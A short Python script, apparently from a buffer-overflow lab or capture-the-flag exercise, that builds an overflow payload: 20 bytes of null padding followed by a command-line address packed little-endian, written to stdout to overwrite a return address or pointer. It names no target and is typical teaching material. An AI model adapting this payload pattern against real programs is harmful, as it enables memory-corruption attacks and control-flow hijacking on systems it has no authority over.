#!/usr/bin/env python
from struct import pack
import sys
def packbuff(addr, padding = 20):
    payload = b''
    payload += b'\x00' * padding
    payload += pack('<I', addr)
    return payload
    
#this function takes in the input from the command line and adds it to a buffer
def main():
    address = int(sys.argv[1],16)
    payload = packbuff(address)
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()


